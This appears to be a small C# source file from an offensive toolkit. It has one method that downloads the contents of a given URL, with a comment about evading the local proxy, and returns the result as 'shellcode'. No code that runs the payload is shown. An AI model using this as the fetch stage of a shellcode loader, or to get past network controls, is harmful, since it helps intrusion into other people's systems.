using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace Code
{
    public class GreatJustice
    {
        public static string mattshot(string thefuckingurl)
        {
            //Download for great justice
            WebRequest webRequest = WebRequest.Create(thefuckingurl);
            webRequest.Method = WebRequestMethods.Http.Get;

            //Attempt to bypass local proxy
            //Comment this line out if it makes your run puke.
            webRequest.Proxy = new WebProxy();

            WebResponse webResponse = webRequest.GetResponse();
            Stream webResponseStream = webResponse.GetResponseStream();
            StreamReader reader = new StreamReader(webResponseStream);
            var shellcode = reader.ReadToEnd();
            webResponseStream.Close();
            return shellcode;
        }
    }
}
